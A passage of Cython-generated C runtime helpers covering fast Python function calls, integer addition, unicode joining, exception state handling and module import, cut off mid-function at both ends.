__Pyx_GetBuiltinName(name);\n}\n\n/* PyFunctionFastCall */\n#if CYTHON_FAST_PYCALL && !CYTHON_VECTORCALL\nstatic PyObject* __Pyx_PyFunction_FastCallNoKw(PyCodeObject *co, PyObject **args, Py_ssize_t na,\n                                               PyObject *globals) {\n    PyFrameObject *f;\n    PyThreadState *tstate = __Pyx_PyThreadState_Current;\n    PyObject **fastlocals;\n    Py_ssize_t i;\n    PyObject *result;\n    assert(globals != NULL);\n    /* XXX Perhaps we should create a specialized\n       PyFrame_New() that doesn\'t take locals, but does\n       take builtins without sanity checking them.\n       */\n    assert(tstate != NULL);\n    f = PyFrame_New(tstate, co, globals, NULL);\n    if (f == NULL) {\n        return NULL;\n    }\n    fastlocals = __Pyx_PyFrame_GetLocalsplus(f);\n    for (i = 0; i < na; i++) {\n        Py_INCREF(*args);\n        fastlocals[i] = *args++;\n    }\n    result = PyEval_EvalFrameEx(f,0);\n    ++tstate->recursion_depth;\n    Py_DECREF(f);\n    --tstate->recursion_depth;\n    return result;\n}\nstatic PyObject *__Pyx_PyFunction_FastCallDict(PyObject *func, PyObject **args, Py_ssize_t nargs, PyObject *kwargs) {\n    PyCodeObject *co = (PyCodeObject *)PyFunction_GET_CODE(func);\n    PyObject *globals = PyFunction_GET_GLOBALS(func);\n    PyObject *argdefs = PyFunction_GET_DEFAULTS(func);\n    PyObject *closure;\n#if PY_MAJOR_VERSION >= 3\n    PyObject *kwdefs;\n#endif\n    PyObject *kwtuple, **k;\n    PyObject **d;\n    Py_ssize_t nd;\n    Py_ssize_t nk;\n    PyObject *result;\n    assert(kwargs == NULL || PyDict_Check(kwargs));\n    nk = kwargs ? PyDict_Size(kwargs) : 0;\n    if (unlikely(Py_EnterRecursiveCall((char*)" while calling a Python object"))) {\n        return NULL;\n    }\n    if (\n#if PY_MAJOR_VERSION >= 3\n            co->co_kwonlyargcount == 0 &&\n#endif\n            likely(kwargs == NULL || nk == 0) &&\n            co->co_flags == (CO_OPTIMIZED | CO_NEWLOCALS | CO_NOFREE)) {\n        if (argdefs == NULL && co->co_argcount == nargs) {\n            result = __Pyx_PyFunction_FastCallNoKw(co, args, nargs, globals);\n            goto done;\n        }\n        else if (nargs == 0 && argdefs != NULL\n                 && co->co_argcount == Py_SIZE(argdefs)) {\n            /* function called with no arguments, but all parameters have\n               a default value: use default values as arguments .*/\n            args = &PyTuple_GET_ITEM(argdefs, 0);\n            result =__Pyx_PyFunction_FastCallNoKw(co, args, Py_SIZE(argdefs), globals);\n            goto done;\n        }\n    }\n    if (kwargs != NULL) {\n        Py_ssize_t pos, i;\n        kwtuple = PyTuple_New(2 * nk);\n        if (kwtuple == NULL) {\n            result = NULL;\n            goto done;\n        }\n        k = &PyTuple_GET_ITEM(kwtuple, 0);\n        pos = i = 0;\n        while (PyDict_Next(kwargs, &pos, &k[i], &k[i+1])) {\n            Py_INCREF(k[i]);\n            Py_INCREF(k[i+1]);\n            i += 2;\n        }\n        nk = i / 2;\n    }\n    else {\n        kwtuple = NULL;\n        k = NULL;\n    }\n    closure = PyFunction_GET_CLOSURE(func);\n#if PY_MAJOR_VERSION >= 3\n    kwdefs = PyFunction_GET_KW_DEFAULTS(func);\n#endif\n    if (argdefs != NULL) {\n        d = &PyTuple_GET_ITEM(argdefs, 0);\n        nd = Py_SIZE(argdefs);\n    }\n    else {\n        d = NULL;\n        nd = 0;\n    }\n#if PY_MAJOR_VERSION >= 3\n    result = PyEval_EvalCodeEx((PyObject*)co, globals, (PyObject *)NULL,\n                               args, (int)nargs,\n                               k, (int)nk,\n                               d, (int)nd, kwdefs, closure);\n#else\n    result = PyEval_EvalCodeEx(co, globals, (PyObject *)NULL,\n                               args, (int)nargs,\n                               k, (int)nk,\n                               d, (int)nd, closure);\n#endif\n    Py_XDECREF(kwtuple);\ndone:\n    Py_LeaveRecursiveCall();\n    return result;\n}\n#endif\n\n/* PyObjectCall */\n#if CYTHON_COMPILING_IN_CPYTHON\nstatic CYTHON_INLINE PyObject* __Pyx_PyObject_Call(PyObject *func, PyObject *arg, PyObject *kw) {\n    PyObject *result;\n    ternaryfunc call = Py_TYPE(func)->tp_call;\n    if (unlikely(!call))\n        return PyObject_Call(func, arg, kw);\n    if (unlikely(Py_EnterRecursiveCall((char*)" while calling a Python object")))\n        return NULL;\n    result = (*call)(func, arg, kw);\n    Py_LeaveRecursiveCall();\n    if (unlikely(!result) && unlikely(!PyErr_Occurred())) {\n        PyErr_SetString(\n            PyExc_SystemError,\n            "NULL result without error in PyObject_Call");\n    }\n    return result;\n}\n#endif\n\n/* PyObjectCallMethO */\n#if CYTHON_COMPILING_IN_CPYTHON\nstatic CYTHON_INLINE PyObject* __Pyx_PyObject_CallMethO(PyObject *func, PyObject *arg) {\n    PyObject *self, *result;\n    PyCFunction cfunc;\n    cfunc = __Pyx_CyOrPyCFunction_GET_FUNCTION(func);\n    self = __Pyx_CyOrPyCFunction_GET_SELF(func);\n    if (unlikely(Py_EnterRecursiveCall((char*)" while calling a Python object")))\n        return NULL;\n    result = cfunc(self, arg);\n    Py_LeaveRecursiveCall();\n    if (unlikely(!result) && unlikely(!PyErr_Occurred())) {\n        PyErr_SetString(\n            PyExc_SystemError,\n            "NULL result without error in PyObject_Call");\n    }\n    return result;\n}\n#endif\n\n/* PyObjectFastCall */\n#if PY_VERSION_HEX < 0x03090000 || CYTHON_COMPILING_IN_LIMITED_API\nstatic PyObject* __Pyx_PyObject_FastCall_fallback(PyObject *func, PyObject **args, size_t nargs, PyObject *kwargs) {\n    PyObject *argstuple;\n    PyObject *result = 0;\n    size_t i;\n    argstuple = PyTuple_New((Py_ssize_t)nargs);\n    if (unlikely(!argstuple)) return NULL;\n    for (i = 0; i < nargs; i++) {\n        Py_INCREF(args[i]);\n        if (__Pyx_PyTuple_SET_ITEM(argstuple, (Py_ssize_t)i, args[i]) < 0) goto bad;\n    }\n    result = __Pyx_PyObject_Call(func, argstuple, kwargs);\n  bad:\n    Py_DECREF(argstuple);\n    return result;\n}\n#endif\nstatic CYTHON_INLINE PyObject* __Pyx_PyObject_FastCallDict(PyObject *func, PyObject **args, size_t _nargs, PyObject *kwargs) {\n    Py_ssize_t nargs = __Pyx_PyVectorcall_NARGS(_nargs);\n#if CYTHON_COMPILING_IN_CPYTHON\n    if (nargs == 0 && kwargs == NULL) {\n        if (__Pyx_CyOrPyCFunction_Check(func) && likely( __Pyx_CyOrPyCFunction_GET_FLAGS(func) & METH_NOARGS))\n            return __Pyx_PyObject_CallMethO(func, NULL);\n    }\n    else if (nargs == 1 && kwargs == NULL) {\n        if (__Pyx_CyOrPyCFunction_Check(func) && likely( __Pyx_CyOrPyCFunction_GET_FLAGS(func) & METH_O))\n            return __Pyx_PyObject_CallMethO(func, args[0]);\n    }\n#endif\n    #if PY_VERSION_HEX < 0x030800B1\n    #if CYTHON_FAST_PYCCALL\n    if (PyCFunction_Check(func)) {\n        if (kwargs) {\n            return _PyCFunction_FastCallDict(func, args, nargs, kwargs);\n        } else {\n            return _PyCFunction_FastCallKeywords(func, args, nargs, NULL);\n        }\n    }\n    #if PY_VERSION_HEX >= 0x030700A1\n    if (!kwargs && __Pyx_IS_TYPE(func, &PyMethodDescr_Type)) {\n        return _PyMethodDescr_FastCallKeywords(func, args, nargs, NULL);\n    }\n    #endif\n    #endif\n    #if CYTHON_FAST_PYCALL\n    if (PyFunction_Check(func)) {\n        return __Pyx_PyFunction_FastCallDict(func, args, nargs, kwargs);\n    }\n    #endif\n    #endif\n    if (kwargs == NULL) {\n        #if CYTHON_VECTORCALL\n        #if Py_VERSION_HEX < 0x03090000\n        vectorcallfunc f = _PyVectorcall_Function(func);\n        #else\n        vectorcallfunc f = PyVectorcall_Function(func);\n        #endif\n        if (f) {\n            return f(func, args, (size_t)nargs, NULL);\n        }\n        #elif defined(__Pyx_CyFunction_USED) && CYTHON_BACKPORT_VECTORCALL\n        if (__Pyx_CyFunction_CheckExact(func)) {\n            __pyx_vectorcallfunc f = __Pyx_CyFunction_func_vectorcall(func);\n            if (f) return f(func, args, (size_t)nargs, NULL);\n        }\n        #endif\n    }\n    if (nargs == 0) {\n        return __Pyx_PyObject_Call(func, __pyx_empty_tuple, kwargs);\n    }\n    #if PY_VERSION_HEX >= 0x03090000 && !CYTHON_COMPILING_IN_LIMITED_API\n    return PyObject_VectorcallDict(func, args, (size_t)nargs, kwargs);\n    #else\n    return __Pyx_PyObject_FastCall_fallback(func, args, (size_t)nargs, kwargs);\n    #endif\n}\n\n/* PyIntBinop */\n#if !CYTHON_COMPILING_IN_PYPY\nstatic PyObject* __Pyx_PyInt_AddObjC(PyObject *op1, PyObject *op2, long intval, int inplace, int zerodivision_check) {\n    CYTHON_MAYBE_UNUSED_VAR(intval);\n    CYTHON_MAYBE_UNUSED_VAR(inplace);\n    CYTHON_UNUSED_VAR(zerodivision_check);\n    #if PY_MAJOR_VERSION < 3\n    if (likely(PyInt_CheckExact(op1))) {\n        const long b = intval;\n        long x;\n        long a = PyInt_AS_LONG(op1);\n        \n            x = (long)((unsigned long)a + (unsigned long)b);\n            if (likely((x^a) >= 0 || (x^b) >= 0))\n                return PyInt_FromLong(x);\n            return PyLong_Type.tp_as_number->nb_add(op1, op2);\n    }\n    #endif\n    #if CYTHON_USE_PYLONG_INTERNALS\n    if (likely(PyLong_CheckExact(op1))) {\n        const long b = intval;\n        long a, x;\n#ifdef HAVE_LONG_LONG\n        const PY_LONG_LONG llb = intval;\n        PY_LONG_LONG lla, llx;\n#endif\n        if (unlikely(__Pyx_PyLong_IsZero(op1))) {\n            return __Pyx_NewRef(op2);\n        }\n        if (likely(__Pyx_PyLong_IsCompact(op1))) {\n            a = __Pyx_PyLong_CompactValue(op1);\n        } else {\n            const digit* digits = __Pyx_PyLong_Digits(op1);\n            const Py_ssize_t size = __Pyx_PyLong_SignedDigitCount(op1);\n            switch (size) {\n                case -2:\n                    if (8 * sizeof(long) - 1 > 2 * PyLong_SHIFT) {\n                        a = -(long) (((((unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0]));\n                        break;\n                    #ifdef HAVE_LONG_LONG\n                    } else if (8 * sizeof(PY_LONG_LONG) - 1 > 2 * PyLong_SHIFT) {\n                        lla = -(PY_LONG_LONG) (((((unsigned PY_LONG_LONG)digits[1]) << PyLong_SHIFT) | (unsigned PY_LONG_LONG)digits[0]));\n                        goto long_long;\n                    #endif\n                    }\n                    CYTHON_FALLTHROUGH;\n                case 2:\n                    if (8 * sizeof(long) - 1 > 2 * PyLong_SHIFT) {\n                        a = (long) (((((unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0]));\n                        break;\n                    #ifdef HAVE_LONG_LONG\n                    } else if (8 * sizeof(PY_LONG_LONG) - 1 > 2 * PyLong_SHIFT) {\n                        lla = (PY_LONG_LONG) (((((unsigned PY_LONG_LONG)digits[1]) << PyLong_SHIFT) | (unsigned PY_LONG_LONG)digits[0]));\n                        goto long_long;\n                    #endif\n                    }\n                    CYTHON_FALLTHROUGH;\n                case -3:\n                    if (8 * sizeof(long) - 1 > 3 * PyLong_SHIFT) {\n                        a = -(long) (((((((unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0]));\n                        break;\n                    #ifdef HAVE_LONG_LONG\n                    } else if (8 * sizeof(PY_LONG_LONG) - 1 > 3 * PyLong_SHIFT) {\n                        lla = -(PY_LONG_LONG) (((((((unsigned PY_LONG_LONG)digits[2]) << PyLong_SHIFT) | (unsigned PY_LONG_LONG)digits[1]) << PyLong_SHIFT) | (unsigned PY_LONG_LONG)digits[0]));\n                        goto long_long;\n                    #endif\n                    }\n                    CYTHON_FALLTHROUGH;\n                case 3:\n                    if (8 * sizeof(long) - 1 > 3 * PyLong_SHIFT) {\n                        a = (long) (((((((unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0]));\n                        break;\n                    #ifdef HAVE_LONG_LONG\n                    } else if (8 * sizeof(PY_LONG_LONG) - 1 > 3 * PyLong_SHIFT) {\n                        lla = (PY_LONG_LONG) (((((((unsigned PY_LONG_LONG)digits[2]) << PyLong_SHIFT) | (unsigned PY_LONG_LONG)digits[1]) << PyLong_SHIFT) | (unsigned PY_LONG_LONG)digits[0]));\n                        goto long_long;\n                    #endif\n                    }\n                    CYTHON_FALLTHROUGH;\n                case -4:\n                    if (8 * sizeof(long) - 1 > 4 * PyLong_SHIFT) {\n                        a = -(long) (((((((((unsigned long)digits[3]) << PyLong_SHIFT) | (unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0]));\n                        break;\n                    #ifdef HAVE_LONG_LONG\n                    } else if (8 * sizeof(PY_LONG_LONG) - 1 > 4 * PyLong_SHIFT) {\n                        lla = -(PY_LONG_LONG) (((((((((unsigned PY_LONG_LONG)digits[3]) << PyLong_SHIFT) | (unsigned PY_LONG_LONG)digits[2]) << PyLong_SHIFT) | (unsigned PY_LONG_LONG)digits[1]) << PyLong_SHIFT) | (unsigned PY_LONG_LONG)digits[0]));\n                        goto long_long;\n                    #endif\n                    }\n                    CYTHON_FALLTHROUGH;\n                case 4:\n                    if (8 * sizeof(long) - 1 > 4 * PyLong_SHIFT) {\n                        a = (long) (((((((((unsigned long)digits[3]) << PyLong_SHIFT) | (unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0]));\n                        break;\n                    #ifdef HAVE_LONG_LONG\n                    } else if (8 * sizeof(PY_LONG_LONG) - 1 > 4 * PyLong_SHIFT) {\n                        lla = (PY_LONG_LONG) (((((((((unsigned PY_LONG_LONG)digits[3]) << PyLong_SHIFT) | (unsigned PY_LONG_LONG)digits[2]) << PyLong_SHIFT) | (unsigned PY_LONG_LONG)digits[1]) << PyLong_SHIFT) | (unsigned PY_LONG_LONG)digits[0]));\n                        goto long_long;\n                    #endif\n                    }\n                    CYTHON_FALLTHROUGH;\n                default: return PyLong_Type.tp_as_number->nb_add(op1, op2);\n            }\n        }\n                x = a + b;\n            return PyLong_FromLong(x);\n#ifdef HAVE_LONG_LONG\n        long_long:\n                llx = lla + llb;\n            return PyLong_FromLongLong(llx);\n#endif\n        \n        \n    }\n    #endif\n    if (PyFloat_CheckExact(op1)) {\n        const long b = intval;\n#if CYTHON_COMPILING_IN_LIMITED_API\n        double a = __pyx_PyFloat_AsDouble(op1);\n#else\n        double a = PyFloat_AS_DOUBLE(op1);\n#endif\n            double result;\n            \n            PyFPE_START_PROTECT("add", return NULL)\n            result = ((double)a) + (double)b;\n            PyFPE_END_PROTECT(result)\n            return PyFloat_FromDouble(result);\n    }\n    return (inplace ? PyNumber_InPlaceAdd : PyNumber_Add)(op1, op2);\n}\n#endif\n\n/* JoinPyUnicode */\nstatic PyObject* __Pyx_PyUnicode_Join(PyObject* value_tuple, Py_ssize_t value_count, Py_ssize_t result_ulength,\n                                      Py_UCS4 max_char) {\n#if CYTHON_USE_UNICODE_INTERNALS && CYTHON_ASSUME_SAFE_MACROS && !CYTHON_AVOID_BORROWED_REFS\n    PyObject *result_uval;\n    int result_ukind, kind_shift;\n    Py_ssize_t i, char_pos;\n    void *result_udata;\n    CYTHON_MAYBE_UNUSED_VAR(max_char);\n#if CYTHON_PEP393_ENABLED\n    result_uval = PyUnicode_New(result_ulength, max_char);\n    if (unlikely(!result_uval)) return NULL;\n    result_ukind = (max_char <= 255) ? PyUnicode_1BYTE_KIND : (max_char <= 65535) ? PyUnicode_2BYTE_KIND : PyUnicode_4BYTE_KIND;\n    kind_shift = (result_ukind == PyUnicode_4BYTE_KIND) ? 2 : result_ukind - 1;\n    result_udata = PyUnicode_DATA(result_uval);\n#else\n    result_uval = PyUnicode_FromUnicode(NULL, result_ulength);\n    if (unlikely(!result_uval)) return NULL;\n    result_ukind = sizeof(Py_UNICODE);\n    kind_shift = (result_ukind == 4) ? 2 : result_ukind - 1;\n    result_udata = PyUnicode_AS_UNICODE(result_uval);\n#endif\n    assert(kind_shift == 2 || kind_shift == 1 || kind_shift == 0);\n    char_pos = 0;\n    for (i=0; i < value_count; i++) {\n        int ukind;\n        Py_ssize_t ulength;\n        void *udata;\n        PyObject *uval = PyTuple_GET_ITEM(value_tuple, i);\n        if (unlikely(__Pyx_PyUnicode_READY(uval)))\n            goto bad;\n        ulength = __Pyx_PyUnicode_GET_LENGTH(uval);\n        if (unlikely(!ulength))\n            continue;\n        if (unlikely((PY_SSIZE_T_MAX >> kind_shift) - ulength < char_pos))\n            goto overflow;\n        ukind = __Pyx_PyUnicode_KIND(uval);\n        udata = __Pyx_PyUnicode_DATA(uval);\n        if (!CYTHON_PEP393_ENABLED || ukind == result_ukind) {\n            memcpy((char *)result_udata + (char_pos << kind_shift), udata, (size_t) (ulength << kind_shift));\n        } else {\n            #if PY_VERSION_HEX >= 0x030D0000\n            if (unlikely(PyUnicode_CopyCharacters(result_uval, char_pos, uval, 0, ulength) < 0)) goto bad;\n            #elif CYTHON_COMPILING_IN_CPYTHON && PY_VERSION_HEX >= 0x030300F0 || defined(_PyUnicode_FastCopyCharacters)\n            _PyUnicode_FastCopyCharacters(result_uval, char_pos, uval, 0, ulength);\n            #else\n            Py_ssize_t j;\n            for (j=0; j < ulength; j++) {\n                Py_UCS4 uchar = __Pyx_PyUnicode_READ(ukind, udata, j);\n                __Pyx_PyUnicode_WRITE(result_ukind, result_udata, char_pos+j, uchar);\n            }\n            #endif\n        }\n        char_pos += ulength;\n    }\n    return result_uval;\noverflow:\n    PyErr_SetString(PyExc_OverflowError, "join() result is too long for a Python string");\nbad:\n    Py_DECREF(result_uval);\n    return NULL;\n#else\n    CYTHON_UNUSED_VAR(max_char);\n    CYTHON_UNUSED_VAR(result_ulength);\n    CYTHON_UNUSED_VAR(value_count);\n    return PyUnicode_Join(__pyx_empty_unicode, value_tuple);\n#endif\n}\n\n/* GetTopmostException */\n#if CYTHON_USE_EXC_INFO_STACK && CYTHON_FAST_THREAD_STATE\nstatic _PyErr_StackItem *\n__Pyx_PyErr_GetTopmostException(PyThreadState *tstate)\n{\n    _PyErr_StackItem *exc_info = tstate->exc_info;\n    while ((exc_info->exc_value == NULL || exc_info->exc_value == Py_None) &&\n           exc_info->previous_item != NULL)\n    {\n        exc_info = exc_info->previous_item;\n    }\n    return exc_info;\n}\n#endif\n\n/* SaveResetException */\n#if CYTHON_FAST_THREAD_STATE\nstatic CYTHON_INLINE void __Pyx__ExceptionSave(PyThreadState *tstate, PyObject **type, PyObject **value, PyObject **tb) {\n  #if CYTHON_USE_EXC_INFO_STACK && PY_VERSION_HEX >= 0x030B00a4\n    _PyErr_StackItem *exc_info = __Pyx_PyErr_GetTopmostException(tstate);\n    PyObject *exc_value = exc_info->exc_value;\n    if (exc_value == NULL || exc_value == Py_None) {\n        *value = NULL;\n        *type = NULL;\n        *tb = NULL;\n    } else {\n        *value = exc_value;\n        Py_INCREF(*value);\n        *type = (PyObject*) Py_TYPE(exc_value);\n        Py_INCREF(*type);\n        *tb = PyException_GetTraceback(exc_value);\n    }\n  #elif CYTHON_USE_EXC_INFO_STACK\n    _PyErr_StackItem *exc_info = __Pyx_PyErr_GetTopmostException(tstate);\n    *type = exc_info->exc_type;\n    *value = exc_info->exc_value;\n    *tb = exc_info->exc_traceback;\n    Py_XINCREF(*type);\n    Py_XINCREF(*value);\n    Py_XINCREF(*tb);\n  #else\n    *type = tstate->exc_type;\n    *value = tstate->exc_value;\n    *tb = tstate->exc_traceback;\n    Py_XINCREF(*type);\n    Py_XINCREF(*value);\n    Py_XINCREF(*tb);\n  #endif\n}\nstatic CYTHON_INLINE void __Pyx__ExceptionReset(PyThreadState *tstate, PyObject *type, PyObject *value, PyObject *tb) {\n  #if CYTHON_USE_EXC_INFO_STACK && PY_VERSION_HEX >= 0x030B00a4\n    _PyErr_StackItem *exc_info = tstate->exc_info;\n    PyObject *tmp_value = exc_info->exc_value;\n    exc_info->exc_value = value;\n    Py_XDECREF(tmp_value);\n    Py_XDECREF(type);\n    Py_XDECREF(tb);\n  #else\n    PyObject *tmp_type, *tmp_value, *tmp_tb;\n    #if CYTHON_USE_EXC_INFO_STACK\n    _PyErr_StackItem *exc_info = tstate->exc_info;\n    tmp_type = exc_info->exc_type;\n    tmp_value = exc_info->exc_value;\n    tmp_tb = exc_info->exc_traceback;\n    exc_info->exc_type = type;\n    exc_info->exc_value = value;\n    exc_info->exc_traceback = tb;\n    #else\n    tmp_type = tstate->exc_type;\n    tmp_value = tstate->exc_value;\n    tmp_tb = tstate->exc_traceback;\n    tstate->exc_type = type;\n    tstate->exc_value = value;\n    tstate->exc_traceback = tb;\n    #endif\n    Py_XDECREF(tmp_type);\n    Py_XDECREF(tmp_value);\n    Py_XDECREF(tmp_tb);\n  #endif\n}\n#endif\n\n/* GetException */\n#if CYTHON_FAST_THREAD_STATE\nstatic int __Pyx__GetException(PyThreadState *tstate, PyObject **type, PyObject **value, PyObject **tb)\n#else\nstatic int __Pyx_GetException(PyObject **type, PyObject **value, PyObject **tb)\n#endif\n{\n    PyObject *local_type = NULL, *local_value, *local_tb = NULL;\n#if CYTHON_FAST_THREAD_STATE\n    PyObject *tmp_type, *tmp_value, *tmp_tb;\n  #if PY_VERSION_HEX >= 0x030C00A6\n    local_value = tstate->current_exception;\n    tstate->current_exception = 0;\n    if (likely(local_value)) {\n        local_type = (PyObject*) Py_TYPE(local_value);\n        Py_INCREF(local_type);\n        local_tb = PyException_GetTraceback(local_value);\n    }\n  #else\n    local_type = tstate->curexc_type;\n    local_value = tstate->curexc_value;\n    local_tb = tstate->curexc_traceback;\n    tstate->curexc_type = 0;\n    tstate->curexc_value = 0;\n    tstate->curexc_traceback = 0;\n  #endif\n#else\n    PyErr_Fetch(&local_type, &local_value, &local_tb);\n#endif\n    PyErr_NormalizeException(&local_type, &local_value, &local_tb);\n#if CYTHON_FAST_THREAD_STATE && PY_VERSION_HEX >= 0x030C00A6\n    if (unlikely(tstate->current_exception))\n#elif CYTHON_FAST_THREAD_STATE\n    if (unlikely(tstate->curexc_type))\n#else\n    if (unlikely(PyErr_Occurred()))\n#endif\n        goto bad;\n    #if PY_MAJOR_VERSION >= 3\n    if (local_tb) {\n        if (unlikely(PyException_SetTraceback(local_value, local_tb) < 0))\n            goto bad;\n    }\n    #endif\n    Py_XINCREF(local_tb);\n    Py_XINCREF(local_type);\n    Py_XINCREF(local_value);\n    *type = local_type;\n    *value = local_value;\n    *tb = local_tb;\n#if CYTHON_FAST_THREAD_STATE\n    #if CYTHON_USE_EXC_INFO_STACK\n    {\n        _PyErr_StackItem *exc_info = tstate->exc_info;\n      #if PY_VERSION_HEX >= 0x030B00a4\n        tmp_value = exc_info->exc_value;\n        exc_info->exc_value = local_value;\n        tmp_type = NULL;\n        tmp_tb = NULL;\n        Py_XDECREF(local_type);\n        Py_XDECREF(local_tb);\n      #else\n        tmp_type = exc_info->exc_type;\n        tmp_value = exc_info->exc_value;\n        tmp_tb = exc_info->exc_traceback;\n        exc_info->exc_type = local_type;\n        exc_info->exc_value = local_value;\n        exc_info->exc_traceback = local_tb;\n      #endif\n    }\n    #else\n    tmp_type = tstate->exc_type;\n    tmp_value = tstate->exc_value;\n    tmp_tb = tstate->exc_traceback;\n    tstate->exc_type = local_type;\n    tstate->exc_value = local_value;\n    tstate->exc_traceback = local_tb;\n    #endif\n    Py_XDECREF(tmp_type);\n    Py_XDECREF(tmp_value);\n    Py_XDECREF(tmp_tb);\n#else\n    PyErr_SetExcInfo(local_type, local_value, local_tb);\n#endif\n    return 0;\nbad:\n    *type = 0;\n    *value = 0;\n    *tb = 0;\n    Py_XDECREF(local_type);\n    Py_XDECREF(local_value);\n    Py_XDECREF(local_tb);\n    return -1;\n}\n\n/* Import */\nstatic PyObject *__Pyx_Import(PyObject *name, PyObject *from_list, int level) {\n    PyObject *module = 0;\n    PyObject *empty_dict = 0;\n    PyObject *empty_list = 0;\n    #if PY_MAJOR_VERSION < 3\n    PyObject *py_import;\n    py_import = __Pyx_PyObject_GetAttrStr(__pyx_b, __pyx_n_s_import);\n    if (unlikely(!py_import))\n        goto bad;\n    if (!from_list) {\n        empty_list = PyList_New(0);\n        if (unlikely(!empty_list))\n            goto bad;\n        from_list = empty_list;\n    }\n    #endif\n    empty_dict = PyDict_New();\n    if (unlikely(!empty_dict))\n        goto bad;\n    {\n        #if PY_MAJOR_VERSION >= 3\n        if (level == -1) {\n            if (strchr(__Pyx_MODULE_NAME, \'.\') != NULL) {\n                module = PyImport_ImportModuleLevelObject(\n                    name, __pyx_d, empty_dict, from_list, 1);\n                if (unlikely(!module)) {\n                    if (unlikely(!PyErr_ExceptionMatches(PyExc_ImportError)))\n                        goto bad;\n                    PyErr_Clear();\n                }\n            }\n            level = 0;\n        }\n        #endif\n        if (!module) {\n            #if PY_MAJOR_VERSION < 3\n            PyObject *py_level = PyInt_FromLong(level);\n            if (unlikely(!py_level))\n                goto bad;\n            module = PyObject_CallFunctionObjArgs(py_import,\n                name, __pyx_d, empty_dict, from_list, py_level, (PyObject *)NULL);\n            Py_DECREF(py_level);\n            #else\n            module = PyImport_ImportModuleLevelObject(\n                name, __pyx_d, empty_dict, from_list, level);\n            #endif\n        }\n    }\nbad:\n    Py_XDECREF(empty_dict);\n    Py_XDECREF(empty_list);\n    #if PY_MAJOR_VERSION < 3\n    Py_XDECREF(py_import);\n    #endif\n    return module;\n}\n\n/* ImportDottedModule */\n#if PY_MAJOR_VERSION >= 3\nstatic PyObject *__Pyx__ImportDottedModule_Error(PyObject *name, PyObject *parts_tuple, Py_ssize_t count) {\n    PyObject *partial_name = NULL, *slice = NULL, *sep = NULL;\n    if (unlikely(PyErr_Occurred())) {\n        PyErr_Clear();\n    }\n    if (likely(PyTuple_GET_SIZE(parts_tuple) == count)) {\n        partial_name = name;\n    } else {\n        slice = PySequence_GetSlice(parts_tuple, 0, count);\n        if (unlikely(!slice))\n            goto bad;\n        sep = PyUnicode_FromStringAndSize(".", 1);\n        if (unlikely(!sep))\n            goto bad;\n        partial_name = PyUnicode_Join(sep, slice);\n    }\n    PyErr_Format(\n#if PY_MAJOR_VERSION < 3\n        PyExc_ImportError,\n        "No module named \'%s\'", PyString_AS_STRING(partial_name));\n#else\n#if PY_VERSION_HEX >= 0x030600B1\n        PyExc_ModuleNotFoundError,\n#else\n        PyExc_ImportError,\n#endif\n        "No module named \'%U\'", partial_name);\n#endif\nbad:\n    Py_XDECREF(sep);\n    Py_XDECREF(slice);\n    Py_XDECREF(partial_name);\n    return NULL;\n}\n#endif\n#if PY_MAJOR_VERSION >= 3\nstatic PyObject *__Pyx__ImportDottedModule_Lookup(PyObject *name) {\n    PyObject *imported_module;\n#if PY_VERSION_HEX < 0x030700A1 || (CYTHON_COMPILING_IN_PYPY && PYPY_VERSION_NUM  < 0x07030400)\n    PyObject *modules = PyImport_GetModuleDict();\n    if (unlikely(!modules))\n        return NULL;\n    imported_module = __Pyx_PyDict_GetItemStr(modules, name);\n    Py_XINCREF(imported_module);\n#else\n    imported_module = PyImport_GetModule(name);\n#endif\n    return imported_module;\n}\n#endif\n#if PY_MAJOR_VERSION >= 3\nstatic PyObject *__Pyx_ImportDottedModule_WalkParts(PyObject *module, PyObject *name, PyObject *parts_tuple) {\n    Py_ssize_t i, nparts;\n    nparts = PyTuple_GET_SIZE(parts_tuple);\n    for (i=1; i < nparts && module; i++) {\n        PyObject *part, *submodule;\n#if CYTHON_ASSUME_SAFE_MACROS && !CYTHON_AVOID_BORROWED_REFS\n        part = PyTuple_GET_ITEM(parts_tuple, i);\n#else\n        part = PySequence_ITEM(parts_tuple, i);\n#endif\n        submodule = __Pyx_PyObject_GetAttrStrNoError(module, part);\n#if !(CYTHON_ASSUME_SAFE_MACROS && !CYTHON_AVOID_BORROWED_REFS)\n        Py_DECREF(part);\n#endif\n        Py_DECREF(module);\n        module = submodule;\n    }\n    if (unlikely(!module)) {\n        return __Pyx__ImportDottedModule_Error(name, parts_tuple, i);\n    }\n    return module;\n}\n#endif\nstatic PyObject *__Pyx__ImportDottedModule(PyObject *name, PyObject *parts_tuple) {\n#if PY_MAJOR_VERSION < 3\n    PyObject *module, *from_list, *star = __pyx_n_s__3;\n    CYTHON_UNUSED_VAR(parts_tuple);\n    from_list = PyList_New(1);\n    if (unlikely(!from_list))\n        return NULL;\n    Py_INCREF(star);\n    PyList_SET_ITEM(from_list, 0, star);\n    module = __Pyx_Import(name, from_list, 0);\n    Py_DECREF(from_list);\n    return module;\n#else\n    PyObject *imported_module;\n    PyObject *module = __Pyx_Import(name, NULL, 0);\n    if (!parts_tuple || unlikely(!module))\n        return module;\n    imported_module = __Pyx__ImportDottedModule_Lookup(name);\n    if (likely(imported_module)) {\n        Py_DECREF(module);\n        return imported_module;\n    }\n    PyErr_Clear();\n    return __Pyx_ImportDottedModule_WalkParts(module, name, parts_tuple);\n#endif\n}\nstatic PyObject *__Pyx_ImportDottedModule(PyObject *name, PyObject *parts_tuple) {\n#if CYTHON_COMPILING_IN_CPYTHON && PY_VERSION_HEX >= 0x030400B1\n    PyObject *module = __Pyx__ImportDottedModule_Lookup(name);\n    if (likely(module)) {\n        PyObject *spec = __Pyx_PyObject_GetAttrStrNoError(module, __pyx_n_s_spec);\n        if (likely(spec)) {\n            PyObject *unsafe = __Pyx_PyObject_GetAttrStrNoError(spec, __pyx_n_s_initializing);\n            if (likely(!unsafe || !__Pyx_PyObject_IsTrue(unsafe))) {\n                Py_DECREF(spec);\n                spec = NULL;\n            }\n            Py_XDECREF(unsafe);\n        }\n        if (likely(!spec)) {\n            PyErr_Clear();\n            return 